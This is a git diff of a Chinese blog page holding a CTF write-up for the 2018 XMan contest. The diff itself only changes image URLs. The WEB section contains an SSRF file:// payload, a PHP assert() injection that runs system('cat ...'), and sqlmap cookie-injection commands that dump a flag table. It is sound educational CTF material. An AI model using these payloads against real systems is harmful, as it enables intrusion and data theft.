@@ -19,16 +19,16 @@
 <meta property="og:site_name" content="AssassinQ">
 <meta property="og:description" content="唉pwn还是没有入门。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ckmlvevc1rcp1q4s185i1kt51pia.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ckmm7f29rh6l8ae1a1agtj8la.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ckmltqe0lo06rj5ci1u6i18a7a.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ckmm2b0llrgid01bp91qkn10e0a.png-j.jpg">
-<meta property="og:image" content="http://t1.aixinxi.net/o_1ckmm99li1nelr7s1e041v133mqa.png-j.jpg">
-<meta property="og:updated_time" content="2018-09-19T09:44:22.470Z">
+<meta property="og:image" content="http://assassinq.com/pics/2018-XMan个人排位赛-review/1.png">
+<meta property="og:image" content="http://assassinq.com/pics/2018-XMan个人排位赛-review/2.png">
+<meta property="og:image" content="http://assassinq.com/pics/2018-XMan个人排位赛-review/3.png">
+<meta property="og:image" content="http://assassinq.com/pics/2018-XMan个人排位赛-review/4.png">
+<meta property="og:image" content="http://assassinq.com/pics/2018-XMan个人排位赛-review/5.png">
+<meta property="og:updated_time" content="2018-10-06T12:44:23.528Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2018 XMan个人排位赛 review">
 <meta name="twitter:description" content="唉pwn还是没有入门。">
-<meta name="twitter:image" content="http://t1.aixinxi.net/o_1ckmlvevc1rcp1q4s185i1kt51pia.png-j.jpg">
+<meta name="twitter:image" content="http://assassinq.com/pics/2018-XMan个人排位赛-review/1.png">
   
     <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
   
@@ -200,7 +200,7 @@
         <p>唉pwn还是没有入门。</p>
 <a id="more"></a>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h2><p>用<code>DiskGenius</code>恢复磁盘：</p>
-<p><img src="http://t1.aixinxi.net/o_1ckmlvevc1rcp1q4s185i1kt51pia.png-j.jpg" alt="直接能得到flag"></p>
+<p><img src="/pics/2018-XMan个人排位赛-review/1.png" alt="直接能得到flag"></p>
 <h2 id="XMAN通行证"><a href="#XMAN通行证" class="headerlink" title="XMAN通行证"></a>XMAN通行证</h2><p>不同的网站解密结果竟然不一样。最后发现这个<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">网站</a>还行。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==</span><br></pre></td></tr></table></figure>
 <p>第一眼就知道先是base64：</p>
@@ -210,12 +210,12 @@
 <p>凯撒位移13位得到flag：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xman&#123;oyay_now_you_get_it&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="PPAP"><a href="#PPAP" class="headerlink" title="PPAP"></a>PPAP</h2><p>用wireshark打开，搜索关键字flag，很容易找到一串base64：</p>
-<p><img src="http://t1.aixinxi.net/o_1ckmm7f29rh6l8ae1a1agtj8la.png-j.jpg" alt="加密部分"></p>
+<p><img src="/pics/2018-XMan个人排位赛-review/2.png" alt="加密部分"></p>
 <p>经过分析以后，具体结构应该是这样的：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yaaaaaaaar, land ho!</span><br><span class="line">    Hey wesley, you got that flag?</span><br><span class="line">Ayy, I got yer files right here, matey!</span><br><span class="line"></span><br><span class="line">            [base64&apos;d jpg]</span><br><span class="line">            [base64&apos;d flag.zip]</span><br><span class="line"></span><br><span class="line">And here be the map to the booty!</span><br><span class="line"></span><br><span class="line">            [base64&apos;d Haar cascade]</span><br><span class="line"></span><br><span class="line">    I don&apos;t understand, this isn&apos;t even a ma-</span><br><span class="line">Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)</span><br><span class="line">Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50!</span><br><span class="line">Lastly, if ye sail the seven seas, you do be a pirate!</span><br></pre></td></tr></table></figure>
 <p>jpg文件和zip文件之间通过等号判断分隔。通过python得到三个文件：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># example</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f1 = open(<span class="string">'b1'</span>, <span class="string">'r'</span>)</span><br><span class="line">enc1 = f1.read()</span><br><span class="line">f2 = open(<span class="string">'b1.jpg'</span>, <span class="string">'w'</span>)</span><br><span class="line">out = base64.b64decode(enc1)</span><br><span class="line">f2.write(out)</span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure>
-<p><img src="http://t1.aixinxi.net/o_1ckmltqe0lo06rj5ci1u6i18a7a.png-j.jpg" alt="拿到的三个文件"></p>
+<p><img src="/pics/2018-XMan个人排位赛-review/3.png" alt="拿到的三个文件"></p>
 <p>然后又通过binwalk发现，这里输出的jpg图片其实不止一张。用foremost输出所有的图片。</p>
 <p>下面用了官方的脚本，用opencv找出数百张图片的其中一张来得到密码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all of the pictures</span></span><br><span class="line">imgs = os.listdir(<span class="string">'jpg'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cascade we'll be using for detection</span></span><br><span class="line">cascade = cv2.CascadeClassifier(<span class="string">'b3.xml'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># From the clues</span></span><br><span class="line">scaling_factor = <span class="number">1.02</span></span><br><span class="line">min_neighbors = <span class="number">10</span>  <span class="comment"># Bumped this up until one pic was left</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> img_name <span class="keyword">in</span> imgs:</span><br><span class="line">    <span class="comment"># Load the image and run the cascade</span></span><br><span class="line">    img = cv2.imread(os.path.join(<span class="string">'jpg'</span>, img_name))</span><br><span class="line">    detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors)</span><br><span class="line">    <span class="keyword">if</span> len(detect) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> (x, y, w, h) <span class="keyword">in</span> detect:</span><br><span class="line">            <span class="comment"># X marks the spot!</span></span><br><span class="line">            cv2.line(img, (x, y),     (x + w, y + h), (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">            cv2.line(img, (x, y + h), (x + w, y),     (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># Save the new image</span></span><br><span class="line">        cv2.imwrite(os.path.join(<span class="string">'detected'</span>, img_name), img)</span><br></pre></td></tr></table></figure>
@@ -229,7 +229,7 @@
 <p>去掉<code>[uuknown]</code>，<code>[DEL]</code>则是去掉后一个字符，得到：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">output :</span><br><span class="line">AUTOKEY&apos;&apos;.DECIPHER&apos;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXOZEZ&apos;</span><br></pre></td></tr></table></figure>
 <p>百度一下autokey，用github上找到的的<a href="https://github.com/Ezran/crypto/blob/master/break_autokey/break_autokey.py" target="_blank" rel="noopener">爆破脚本</a>得到flag。</p>
-<p><img src="http://t1.aixinxi.net/o_1ckmm2b0llrgid01bp91qkn10e0a.png-j.jpg" alt="爆破结果"></p>
+<p><img src="/pics/2018-XMan个人排位赛-review/4.png" alt="爆破结果"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-676.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF</span><br><span class="line"></span><br><span class="line">HELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF</span><br></pre></td></tr></table></figure>
 <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SIMPLE-SSRF"><a href="#SIMPLE-SSRF" class="headerlink" title="SIMPLE SSRF"></a>SIMPLE SSRF</h2><p>hint里提示<code>curl</code>还有<code>flag在/etc/flag.txt</code>，大概是通过file协议读取本地文件。payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://www.baidu.com/etc/flag.txt#</span><br></pre></td></tr></table></figure>
@@ -238,7 +238,7 @@
 <p>这里有<code>assert()</code>，可以执行函数中的命令，通过构造闭合前面的<code>strpos()</code>绕过，来得到<code>templates/flag.php</code>中的内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;, &apos;..&apos;) or system(&apos;cat templates/flag.php&apos;); //</span><br></pre></td></tr></table></figure>
 <h2 id="BBSQLI"><a href="#BBSQLI" class="headerlink" title="BBSQLI"></a>BBSQLI</h2><p>cookie注入，PHPSESSID拿下来：</p>
-<p><img src="http://t1.aixinxi.net/o_1ckmm99li1nelr7s1e041v133mqa.png-j.jpg" alt="PHPSESSID"></p>
+<p><img src="/pics/2018-XMan个人排位赛-review/5.png" alt="PHPSESSID"></p>
 <p>用sqlmap跑：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 跑表名</span><br><span class="line">python sqlmap.py -u http://202.112.51.184:16080/ --cookie "PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49" --table --level 2</span><br><span class="line">// 跑列名</span><br><span class="line">python sqlmap.py -u http://202.112.51.184:16080/ --cookie "PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49" --columns -T '[GDJM_flag]' --level 2</span><br><span class="line">// 跑flag</span><br><span class="line">python sqlmap.py -u http://202.112.51.184:16080/ --cookie "PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49" --dump -T '[GDJM_flag]' -C 'flag' --level 2</span><br></pre></td></tr></table></figure>
 <p>PS：不同的level等级，SQLMAP所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。</p>
